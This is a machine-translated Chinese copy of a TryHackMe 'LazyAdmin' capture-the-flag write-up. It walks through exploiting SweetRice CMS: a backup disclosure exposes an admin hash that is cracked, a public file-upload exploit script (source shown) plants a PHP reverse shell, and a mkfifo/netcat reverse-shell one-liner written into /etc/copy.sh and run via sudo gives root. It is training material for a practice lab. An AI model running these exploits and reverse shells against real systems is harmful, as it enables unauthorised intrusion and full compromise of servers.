<html>
<head>
<title>TryHackMe writeup: LazyAdmin</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">TryHackMe报道:LazyAdmin</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/lazyadmin-tryhackme-writeup-c5f0d113bec6?source=collection_archive---------1-----------------------#2022-02-09">https://infosecwriteups.com/lazyadmin-tryhackme-writeup-c5f0d113bec6?source=collection_archive---------1-----------------------#2022-02-09</a></blockquote><div><div class="fc ii ij ik il im"/><div class="in io ip iq ir"><div class=""/><p id="6a19" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated"><a class="ae kp" href="https://www.tryhackme.com/room/lazyadmin" rel="noopener ugc nofollow" target="_blank"> LazyAdmin (2019) </a>房间相当有趣。我假设管理员很“懒”，因此这个挑战会很容易。我错了，我发现自己依赖于一个以前的黑客关于这个挑战的文章。</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div class="gi gj kq"><img src="../Images/10a4d0b143d3b1674672b3f4d605cbf2.png" data-original-src="https://miro.medium.com/v2/resize:fit:774/format:webp/1*PmYen0AKo1QrCtXCtThLpQ.png"/></div><figcaption class="ky kz gk gi gj la lb bd b be z dk translated">基本图像:“来自地狱的杂种操作员”和“Lil &amp; Put”</figcaption></figure><h1 id="83a7" class="lc ld iu bd le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz bi translated">程序</h1><h2 id="e3e8" class="ma ld iu bd le mb mc dn li md me dp lm kc mf mg lq kg mh mi lu kk mj mk ly ml bi translated">网络扫描</h2><p id="65f7" class="pw-post-body-paragraph jr js iu jt b ju mm jw jx jy mn ka kb kc mo ke kf kg mp ki kj kk mq km kn ko in bi translated">与这些boot2root机器一样，我启动了LazyAdmin机器并开始探测机器。我用以下参数运行了一次<code class="fe mr ms mt mu b">nmap</code>扫描:</p><p id="53ac" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated"><code class="fe mr ms mt mu b"><strong class="jt iv">$ nmap -sT -A -v -Pn -O -p- -oX tcp_scan.xml &lt;target ip address&gt;</strong></code></p><p id="08ef" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">扫描报告在端口22上有一个OpenSSH服务，在端口80上有一个Apache服务器。</p><h2 id="3882" class="ma ld iu bd le mb mc dn li md me dp lm kc mf mg lq kg mh mi lu kk mj mk ly ml bi translated">探测web服务器</h2><p id="a933" class="pw-post-body-paragraph jr js iu jt b ju mm jw jx jy mn ka kb kc mo ke kf kg mp ki kj kk mq km kn ko in bi translated">然后，我运行<code class="fe mr ms mt mu b">gobuster</code>工具对目录进行暴力破解，发现了一个名为<code class="fe mr ms mt mu b">/content</code>的子目录。浏览到<code class="fe mr ms mt mu b">/content</code>子目录，我发现网络服务器正在运行一个名为“SweetRice”的内容管理系统，如下所示:</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div role="button" tabindex="0" class="mw mx di my bf mz"><div class="gi gj mv"><img src="../Images/100acd2e347432e3b2c0227a7095b69c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*hs7Le0cYX_C8kV8V30Xtog.png"/></div></div><figcaption class="ky kz gk gi gj la lb bd b be z dk translated">http:// <target ip="" address=""> /content的内容</target></figcaption></figure><p id="16d0" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">于是我使用<code class="fe mr ms mt mu b">searchsploit</code>获得了一个与SweetRice CMS相关的漏洞列表:</p><pre class="kr ks kt ku gu na mu nb nc aw nd bi"><span id="2747" class="ma ld iu mu b gz ne nf l ng nh"><strong class="mu iv">└─$ searchsploit sweetrice</strong> <br/> [...]</span><span id="a19b" class="ma ld iu mu b gz ni nf l ng nh"> Exploit Title | Path<br/> — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — -<br/>SweetRice 0.5.3 — Remote File Inclusion | php/webapps/10246.txt<br/>SweetRice 0.6.7 — Multiple Vulnerabilities | php/webapps/15413.txt<br/>SweetRice 1.5.1 — Arbitrary File Download | php/webapps/40698.py<br/>SweetRice 1.5.1 — Arbitrary File Upload | php/webapps/40716.py<br/>SweetRice 1.5.1 — Backup Disclosure | php/webapps/40718.txt<br/>SweetRice 1.5.1 — Cross-Site Request Forgery | php/webapps/40692.html<br/>SweetRice 1.5.1 — Cross-Site Request Forgery / PHP Code Execution | php/webapps/40700.html<br/>SweetRice &lt; 0.6.4 — ‘FCKeditor’ Arbitrary File Upload | php/webapps/14184.txt</span><span id="530b" class="ma ld iu mu b gz ni nf l ng nh">  [...]</span></pre><p id="975a" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我决定先尝试利用<em class="nj"> SweetRice 1.5.1 —备份披露</em>漏洞，因此<code class="fe mr ms mt mu b">cat</code>给出了运行漏洞的指令:</p><pre class="kr ks kt ku gu na mu nb nc aw nd bi"><span id="b948" class="ma ld iu mu b gz ne nf l ng nh"><strong class="mu iv">└─$ cat /usr/share/exploitdb/exploits/php/webapps/40718.txt</strong><br/>Title: SweetRice 1.5.1 — Backup Disclosure<br/>Application: SweetRice<br/>Versions Affected: 1.5.1<br/>Vendor URL: <a class="ae kp" href="http://www.basic-cms.org/" rel="noopener ugc nofollow" target="_blank">http://www.basic-cms.org/</a><br/>Software URL: <a class="ae kp" href="http://www.basic-cms.org/attachment/sweetrice-1.5.1.zip" rel="noopener ugc nofollow" target="_blank">http://www.basic-cms.org/attachment/sweetrice-1.5.1.zip</a><br/>Discovered by: Ashiyane Digital Security Team<br/>Tested on: Windows 10<br/>Bugs: Backup Disclosure<br/>Date: 16-Sept-2016</span><span id="2518" class="ma ld iu mu b gz ni nf l ng nh">Proof of Concept :</span><span id="72c3" class="ma ld iu mu b gz ni nf l ng nh">You can access to all mysql backup and download them from this directory.<br/>http://localhost/inc/mysql_backup</span><span id="2b67" class="ma ld iu mu b gz ni nf l ng nh">and can access to website files backup from:<br/>http://localhost/SweetRice-transfer.zip</span></pre><p id="aec9" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">有意思。所以我决定在浏览器中输入以下内容:</p><pre class="kr ks kt ku gu na mu nb nc aw nd bi"><span id="5e00" class="ma ld iu mu b gz ne nf l ng nh">(#1) http://&lt;target ip address&gt;/content/inc/mysql_backup<br/>(#2) http://&lt;target ip address&gt;/content/SweetRice-transfer.zip</span></pre><p id="3f34" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">链接#2返回了一个“没有找到文件”404错误，但是链接#1给了我一个看起来像SQL转储的东西。因此，很自然地，我下载了它，并用文本编辑程序检查了它。我在第79行发现了一个有趣的条目:</p><pre class="kr ks kt ku gu na mu nb nc aw nd bi"><span id="704b" class="ma ld iu mu b gz ne nf l ng nh">[ ... snip ... ]</span><span id="9cf3" class="ma ld iu mu b gz ni nf l ng nh">14 =&gt; ‘INSERT INTO `% — %_options` VALUES(\’1\’,\’global_setting\’,\’a:17:{s:4:\\”name\\”;s:25:\\”Lazy Admin&amp;#039;s Website\\”;s:6:\\”author\\”;s:10:\\”Lazy Admin\\”;s:5:\\”title\\”;s:0:\\”\\”;s:8:\\”keywords\\”;s:8:\\”Keywords\\”;s:11:\\”description\\”;s:11:\\”Description\\”;s:5:<strong class="mu iv">\\”admin\\”;s:7:\\”manager\\”;s:6:\\”passwd\\”;s:32:\\”42f749ade7f9e195bf475f37a44cafcb\\”</strong>;s:5:\\”close\\”;i:1;s:9:\\”close_tip\\”;s:454:\\”&lt;p&gt;Welcome to SweetRice — Thank your for install SweetRice as your website management system.&lt;/p&gt;&lt;h1&gt;This site is building now , please come late.&lt;/h1&gt;&lt;p&gt;If you are the webmaster,please go to Dashboard -&gt; General -&gt; Website setting &lt;/p&gt;&lt;p&gt;and uncheck the checkbox \\”Site close\\” to open your website.&lt;/p&gt;&lt;p&gt;More help at &lt;a href=\\"<a class="ae kp" href="http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\" rel="noopener ugc nofollow" target="_blank">http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\</a>"&gt;Tip for Basic CMS SweetRice installed&lt;/a&gt;&lt;/p&gt;\\”;s:5:\\”cache\\”;i:0;s:13:\\”cache_expired\\”;i:0;s:10:\\”user_track\\”;i:0;s:11:\\”url_rewrite\\”;i:0;s:4:\\”logo\\”;s:0:\\”\\”;s:5:\\”theme\\”;s:0:\\”\\”;s:4:\\”lang\\”;s:9:\\”en-us.php\\”;s:11:\\”admin_email\\”;N;}\’,\’1575023409\’);’,</span><span id="0e84" class="ma ld iu mu b gz ni nf l ng nh">[ ... snip ... ]</span></pre><p id="c735" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">这看起来像是包含了管理员面板的配置信息。目测SQL条目，我看到:</p><pre class="kr ks kt ku gu na mu nb nc aw nd bi"><span id="8882" class="ma ld iu mu b gz ne nf l ng nh">”admin\\”;s:7:\\”manager\\”;s:6:\\”passwd\\”;s:32:\\”42f749ade7f9e195bf475f37a44cafcb\\”</span></pre><p id="ce29" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">好像用户名是<code class="fe mr ms mt mu b">manager</code>，密码是hash <code class="fe mr ms mt mu b">42f749ade7f9e195bf475f37a44cafcb</code>。我用<a class="ae kp" href="https://crackstation.net/" rel="noopener ugc nofollow" target="_blank"> CrackStation (n.d.) </a>破解hash，得到了<code class="fe mr ms mt mu b">Password123</code>的结果。</p><p id="69e0" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">鉴于这个房间名为“LazyAdmin”，我尝试使用管理器和密码123用户名和密码组合登录SSH服务:</p><pre class="kr ks kt ku gu na mu nb nc aw nd bi"><span id="a38a" class="ma ld iu mu b gz ne nf l ng nh"><strong class="mu iv">└─$ ssh manager@&lt;target ip address&gt; </strong><br/>The authenticity of host ‘&lt;target ip address&gt; (&lt;target ip address&gt;)’ can’t be established.<br/>ED25519 key fingerprint is SHA256:gIHwIzi5a1G1WvkLMxJuFhSXiUnHy58kdQUcxmC6rIQ.<br/>This host key is known by the following other names/addresses:<br/> ~/.ssh/known_hosts:80: [hashed name]<br/>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes<br/>Warning: Permanently added ‘&lt;target ip address&gt;’ (ED25519) to the list of known hosts.<br/>manager@&lt;target ip address&gt;’s password: <strong class="mu iv">[Password123]</strong><br/>Permission denied, please try again.<br/>manager@&lt;target ip address&gt;’s password: <strong class="mu iv">[Password123]</strong><br/>Permission denied, please try again.<br/>manager@&lt;target ip address&gt;’s password: <strong class="mu iv">[Password123]</strong><br/>manager@&lt;target ip address&gt;: Permission denied (publickey,password).</span></pre><p id="0742" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">嗯，我的直觉到此为止😋</p><h2 id="5b13" class="ma ld iu bd le mb mc dn li md me dp lm kc mf mg lq kg mh mi lu kk mj mk ly ml bi translated">文件上传漏洞</h2><p id="1c4a" class="pw-post-body-paragraph jr js iu jt b ju mm jw jx jy mn ka kb kc mo ke kf kg mp ki kj kk mq km kn ko in bi translated">所以我想我应该专注于开发sweet rice web应用程序。我试着摆弄管理面板，但没有任何进展。因此，回头看一下SearchSploit的结果，我注意到了另一个名为“sweet rice 1 . 5 . 1——任意文件上传”的漏洞，我意识到我可以用它将web shell上传到web服务器上。</p><p id="12ff" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">所以我决定运行脚本，并得到以下错误:</p><pre class="kr ks kt ku gu na mu nb nc aw nd bi"><span id="b776" class="ma ld iu mu b gz ne nf l ng nh">[ … snip … ]</span><span id="5629" class="ma ld iu mu b gz ni nf l ng nh">Enter The Target URL(Example : localhost.com) : http://&lt;target ip address&gt;/content/<br/>Traceback (most recent call last):<br/> File “exploit.py”, line 37, in &lt;module&gt;<br/> host = input(“Enter The Target URL(Example : localhost.com) : “)<br/> File “&lt;string&gt;”, line 1<br/> http://&lt;target ip address&gt;/content/<br/> ^<br/>SyntaxError: invalid syntax</span></pre><p id="50dc" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">好吧。让我们来看看源代码:</p><pre class="kr ks kt ku gu na mu nb nc aw nd bi"><span id="70ee" class="ma ld iu mu b gz ne nf l ng nh">[ ... snip ... ]</span><span id="8046" class="ma ld iu mu b gz ni nf l ng nh"># Get Host &amp; User &amp; Pass &amp; filename<br/>host = input(“Enter The Target URL(Example : localhost.com) : “)<br/>username = input(“Enter Username : “)<br/>password = input(“Enter Password : “)<br/>filename = input(“Enter FileName (Example:.htaccess,shell.php5,index.html) : “)<br/>file = {‘upload[]’: open(filename, ‘rb’)}</span><span id="68d2" class="ma ld iu mu b gz ni nf l ng nh">payload = {<br/>    ‘user’:username,<br/>    ‘passwd’:password,<br/>    ‘rememberMe’:’’<br/>}</span><span id="c7a1" class="ma ld iu mu b gz ni nf l ng nh">with session() as r:<br/>    login = r.post(‘http://' + host + ‘/as/?type=signin’, data=payload)<br/>    success = ‘Login success’<br/>    if login.status_code == 200:<br/>        print(“[+] Sending User&amp;Pass…”)<br/>            if login.text.find(success) &gt; 1:<br/>                print(“[+] Login Succssfully…”)<br/>            else:<br/>               print(“[-] User or Pass is incorrent…”)<br/>               print(“Good Bye…”)<br/>               exit()<br/>               pass<br/>            pass<br/>    uploadfile = r.post(‘<a class="ae kp" rel="noopener ugc nofollow" target="_blank" href="/'">http://’</a> + host + ‘/as/?type=media_center&amp;mode=upload’, files=file)<br/>    if uploadfile.status_code == 200:<br/>        print(“[+] File Uploaded…”)<br/>        print(“[+] URL : http://” + host + “/attachment/” + filename)<br/>        pass</span></pre><p id="a46d" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">需要做出两个重要的改变:</p><ul class=""><li id="c96b" class="nk nl iu jt b ju jv jy jz kc nm kg nn kk no ko np nq nr ns bi translated">首先，当脚本要求<code class="fe mr ms mt mu b">host</code>、<code class="fe mr ms mt mu b">username</code>、<code class="fe mr ms mt mu b">password</code>和<code class="fe mr ms mt mu b">filename</code>时，需要将<code class="fe mr ms mt mu b">input()</code>函数改为<code class="fe mr ms mt mu b">raw_input()</code></li><li id="a0ea" class="nk nl iu jt b ju nt jy nu kc nv kg nw kk nx ko np nq nr ns bi translated">第二，输入<code class="fe mr ms mt mu b">host</code>时，只放入<code class="fe mr ms mt mu b">&lt;target ip address&gt;/&lt;sweetrice directory&gt;</code>减去<code class="fe mr ms mt mu b">http://</code>位。该脚本的作者已经设置发送带有<code class="fe mr ms mt mu b">http://</code>前缀的web请求，添加另一个“http://”将会混淆漏洞利用脚本。</li></ul><p id="909a" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">现在我只需要选择和配置一个web shell。我会选<em class="nj"> Pentest Monkey的反壳</em>，它位于:</p><p id="8e38" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated"><code class="fe mr ms mt mu b">/usr/share/webshells/php/php-reverse-shell.php</code></p><p id="b371" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">在Kali Linux上。我设置了以下配置:</p><pre class="kr ks kt ku gu na mu nb nc aw nd bi"><span id="7159" class="ma ld iu mu b gz ne nf l ng nh">[ ... snip ... ]</span><span id="3cca" class="ma ld iu mu b gz ni nf l ng nh">set_time_limit (0);<br/>$VERSION = “1.0”;<br/>$ip = ‘&lt;my attackbox ip address&gt;’; // CHANGE THIS<br/>$port = 4444; // CHANGE THIS<br/>$chunk_size = 1400;<br/>$write_a = null;</span><span id="e786" class="ma ld iu mu b gz ni nf l ng nh">[ ... snip ... ]</span></pre><p id="d287" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">运行漏洞，然后…</p><pre class="kr ks kt ku gu na mu nb nc aw nd bi"><span id="2c32" class="ma ld iu mu b gz ne nf l ng nh"><strong class="mu iv">└─$ python exploit.py</strong></span><span id="a24a" class="ma ld iu mu b gz ni nf l ng nh">Enter The Target URL(Example : localhost.com) : &lt;target ip address&gt;/content<br/>Enter Username : manager<br/>Enter Password : Password123 <br/>Enter FileName (Example:.htaccess,shell.php5,index.html) : shell.php5<br/>[+] Sending User&amp;Pass…<br/>[+] Login Succssfully…<br/>[+] File Uploaded…<br/>[+] URL : http://&lt;target ip address&gt;/content/attachment/shell.php5</span></pre><p id="40fc" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我只需要设置一个netcat监听器，并通过我的web浏览器请求php脚本:</p><pre class="kr ks kt ku gu na mu nb nc aw nd bi"><span id="35c5" class="ma ld iu mu b gz ne nf l ng nh"><strong class="mu iv">└─$ nc -l -n -v -p 4444</strong><br/>listening on [any] 4444 …</span><span id="9110" class="ma ld iu mu b gz ni nf l ng nh">[ … requests the php shell …]</span><span id="7807" class="ma ld iu mu b gz ni nf l ng nh">connect to [&lt;attackbox ip address&gt;] from (UNKNOWN) [&lt;target ip address&gt;] 57614<br/>Linux THM-Chal 4.15.0–70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux<br/> 00:17:45 up 1:32, 0 users, load average: 0.00, 0.00, 0.00<br/>USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT<br/>uid=33(www-data) gid=33(www-data) groups=33(www-data)<br/>/bin/sh: 0: can’t access tty; job control turned off<br/><strong class="mu iv">$ whoami</strong><br/>www-data</span></pre><p id="b2fe" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我加入了。</p><h2 id="78cd" class="ma ld iu bd le mb mc dn li md me dp lm kc mf mg lq kg mh mi lu kk mj mk ly ml bi translated">标志和初始访问后</h2><p id="e661" class="pw-post-body-paragraph jr js iu jt b ju mm jw jx jy mn ka kb kc mo ke kf kg mp ki kj kk mq km kn ko in bi translated">我将继续获取用户标志，并想出一种获取root权限的方法:</p><pre class="kr ks kt ku gu na mu nb nc aw nd bi"><span id="9a95" class="ma ld iu mu b gz ne nf l ng nh"><strong class="mu iv">$ cd /home</strong><br/><strong class="mu iv">$ ls</strong><br/>itguy<br/><strong class="mu iv">$ cd itguy</strong><br/><strong class="mu iv">$ ls</strong><br/>Desktop<br/>Documents<br/>Downloads<br/>Music<br/>Pictures<br/>Public<br/>Templates<br/>Videos<br/>backup.pl<br/>examples.desktop<br/>mysql_login.txt<br/>user.txt<br/><strong class="mu iv">$ cat user.txt # &lt;- the user flag<br/></strong><em class="nj">[redacted]</em></span></pre><p id="aa4d" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">好吧，这很好。但现在我需要想办法找到根。在尝试使用<code class="fe mr ms mt mu b">mysql_login.txt</code>给出的凭证登录MySQL数据库之后，并且在由于严格的目录许可而无法将Linux智能枚举(<a class="ae kp" href="https://github.com/diego-treitos/linux-smart-enumeration" rel="noopener ugc nofollow" target="_blank"> Blanco，n.d. </a>)加载到系统上之后，我决定转而专注于通过<code class="fe mr ms mt mu b">backup.pl</code>脚本获得root访问权限。脚本的内容是:</p><pre class="kr ks kt ku gu na mu nb nc aw nd bi"><span id="e58d" class="ma ld iu mu b gz ne nf l ng nh"><strong class="mu iv">$ cat backup.pl</strong><br/>#!/usr/bin/perl</span><span id="69e4" class="ma ld iu mu b gz ni nf l ng nh">system(“sh”, “/etc/copy.sh”);</span></pre><p id="3263" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated"><code class="fe mr ms mt mu b">/etc/copy.sh</code>剧本看起来很有趣。其内容是:</p><pre class="kr ks kt ku gu na mu nb nc aw nd bi"><span id="570b" class="ma ld iu mu b gz ne nf l ng nh"><strong class="mu iv">$ cat /etc/copy.sh</strong><br/>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.0.190 5554 &gt;/tmp/f</span></pre><p id="9bf6" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我知道我必须对这个脚本做些什么来获得root访问权限，但是我就是不能把我的手指放在它上面。因此，我尝试研究这些命令，并最终在其他文章中寻找“提示”我看到了<a class="ae kp" href="https://muirlandoracle.co.uk/2020/01/11/lazyadmin-write-up/" rel="noopener ugc nofollow" target="_blank">《穆兰多尔》(2020) </a>写的一篇关于这个房间的文章，并决定复制他们的技巧:</p><pre class="kr ks kt ku gu na mu nb nc aw nd bi"><span id="1407" class="ma ld iu mu b gz ne nf l ng nh">[ ... target machine ... ]</span><span id="d8d2" class="ma ld iu mu b gz ni nf l ng nh"><strong class="mu iv">$ echo “rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;target ip address&gt; 5554 &gt;/tmp/f” &gt; /etc/copy.sh</strong><br/><strong class="mu iv">$ sudo /usr/bin/perl /home/itguy/backup.pl</strong></span><span id="2201" class="ma ld iu mu b gz ni nf l ng nh">[ ... attackbox ... ]</span><span id="f110" class="ma ld iu mu b gz ni nf l ng nh"><strong class="mu iv">└─$ nc -l -v -n -p 5554</strong><br/>listening on [any] 5554 ...<br/>connect to [&lt;attackbox ip address&gt;] from (UNKNOWN) [&lt;target ip address&gt;] 36926<br/>/bin/sh: 0: can't access tty; job control turned off<br/><strong class="mu iv"># id</strong><br/>uid=0(root) gid=0(root) groups=0(root)<br/><strong class="mu iv"># cat /root/root.txt # &lt;- the root flag</strong><br/><em class="nj">[redacted]</em></span></pre><h1 id="a96d" class="lc ld iu bd le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz bi translated">摘要</h1><p id="ab63" class="pw-post-body-paragraph jr js iu jt b ju mm jw jx jy mn ka kb kc mo ke kf kg mp ki kj kk mq km kn ko in bi translated">尽管有这个名字，但在这里设计旗帜需要的技巧比我准备好的要多一些。我需要<a class="ae kp" href="https://muirlandoracle.co.uk/2020/01/11/lazyadmin-write-up/" rel="noopener ugc nofollow" target="_blank">《穆兰道尔》(2020) </a>的帮助，我需要更多的练习才能提升到精英黑客的地位。</p><p id="ec50" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">同样值得注意的是，最近，<a class="ae kp" href="https://www.hackthebox.com/blog/It-is-Okay-to-Use-Writeups" rel="noopener ugc nofollow" target="_blank">“ippsec”和“0x df”(2022)</a>提出，像我这样的初学者，如果他们真的很难侵入模拟计算机或网络，可以参考文献。我想补充一点，在写文章之前，你应该先试着自己黑一个电脑系统。此外，如果你决定写自己的报告，一定要在该表扬的地方给予表扬；-)</p><h2 id="38c8" class="ma ld iu bd le mb mc dn li md me dp lm kc mf mg lq kg mh mi lu kk mj mk ly ml bi translated">吸取的教训</h2><ul class=""><li id="3fd8" class="nk nl iu jt b ju mm jy mn kc ny kg nz kk oa ko np nq nr ns bi translated">漏洞利用有时会中断，所以一定要有编码和调试背景来修复它们；-)</li><li id="0fc4" class="nk nl iu jt b ju nt jy nu kc nv kg nw kk nx ko np nq nr ns bi translated">在没有<code class="fe mr ms mt mu b">nano</code>、<code class="fe mr ms mt mu b">vim</code>或其他基于终端的文本编辑器的情况下，使用<code class="fe mr ms mt mu b">echo</code>覆盖具有<code class="fe mr ms mt mu b">a+rwx</code>文件权限的文件。</li><li id="483a" class="nk nl iu jt b ju nt jy nu kc nv kg nw kk nx ko np nq nr ns bi translated">人们不应该过分依赖Linux智能枚举(<a class="ae kp" href="https://github.com/diego-treitos/linux-smart-enumeration" rel="noopener ugc nofollow" target="_blank"> Blanco，n.d. </a>)或<em class="nj"> Linux漏洞利用建议者</em>(<a class="ae kp" href="https://github.com/mzet-/linux-exploit-suggester" rel="noopener ugc nofollow" target="_blank">“mzet”，n.d. </a>)。因为有时目录权限可能非常严格。</li><li id="9a08" class="nk nl iu jt b ju nt jy nu kc nv kg nw kk nx ko np nq nr ns bi translated">不要低估“懒惰”的系统管理员，尽管他们很懒，但仍然很难工作。</li></ul><h1 id="3b39" class="lc ld iu bd le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz bi translated">引用的作品</h1><p id="327f" class="pw-post-body-paragraph jr js iu jt b ju mm jw jx jy mn ka kb kc mo ke kf kg mp ki kj kk mq km kn ko in bi translated">布兰科博士。<em class="nj"> Linux智能枚举:用于pentesting和CTF的Linux枚举工具，具有详细级别</em>。GitHub。2022年2月7日检索自:<a class="ae kp" href="https://github.com/diego-treitos/linux-smart-enumeration" rel="noopener ugc nofollow" target="_blank">https://github.com/diego-treitos/linux-smart-enumeration</a></p><p id="d7da" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">裂解站(未标明)。2022年2月7日检索自:<a class="ae kp" href="https://crackstation.net/" rel="noopener ugc nofollow" target="_blank">https://crackstation.net/</a></p><p id="ebdf" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">“ippsec”和“0x df”(2022)。使用书面材料是可以的。黑盒子。2022年2月7日检索自:<a class="ae kp" href="https://www.hackthebox.com/blog/It-is-Okay-to-Use-Writeups" rel="noopener ugc nofollow" target="_blank">https://www.hackthebox.com/blog/It-is-Okay-to-Use-Writeups</a></p><p id="43d2" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">“Mrs eth 6797”(2019)。拉扎德明。TryHackMe。2022年2月7日检索自:<a class="ae kp" href="https://www.tryhackme.com/room/lazyadmin" rel="noopener ugc nofollow" target="_blank">https://www.tryhackme.com/room/lazyadmin</a></p><p id="ed1f" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">《穆兰道尔》(2020)。<em class="nj"> LazyAdmin —向上写</em>。2022年2月7日检索自:<a class="ae kp" href="https://muirlandoracle.co.uk/2020/01/11/lazyadmin-write-up/" rel="noopener ugc nofollow" target="_blank">https://muirlandoracle.co.uk/2020/01/11/lazyadmin-write-up/</a></p><p id="0431" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">“mzet”(未注明)。<em class="nj"> Linux权限提升审计工具</em>。GitHub。2022年2月7日检索自:【https://github.com/mzet-/linux-exploit-suggester T2】</p></div><div class="ab cl ob oc hy od" role="separator"><span class="oe bw bk of og oh"/><span class="oe bw bk of og oh"/><span class="oe bw bk of og"/></div><div class="in io ip iq ir"><h1 id="5064" class="lc ld iu bd le lf oi lh li lj oj ll lm ln ok lp lq lr ol lt lu lv om lx ly lz bi translated">🔈 🔈Infosec Writeups正在组织其首次虚拟会议和网络活动。如果你对信息安全感兴趣，这是最酷的地方，有16个令人难以置信的演讲者和10多个小时充满力量的讨论会议。<a class="ae kp" href="https://iwcon.live/" rel="noopener ugc nofollow" target="_blank">查看更多详情并在此注册。</a></h1><div class="on oo gq gs op oq"><a href="https://iwcon.live/" rel="noopener  ugc nofollow" target="_blank"><div class="or ab fp"><div class="os ab ot cl cj ou"><h2 class="bd iv gz z fq ov fs ft ow fv fx it bi translated">IWCon2022 - Infosec书面报告虚拟会议</h2><div class="ox l"><h3 class="bd b gz z fq ov fs ft ow fv fx dk translated">与世界上最优秀的信息安全专家建立联系。了解网络安全专家如何取得成功。将新技能添加到您的…</h3></div><div class="oy l"><p class="bd b dl z fq ov fs ft ow fv fx dk translated">iwcon.live</p></div></div><div class="oz l"><div class="pa l pb pc pd oz pe kw oq"/></div></div></a></div></div></div>    
</body>
</html>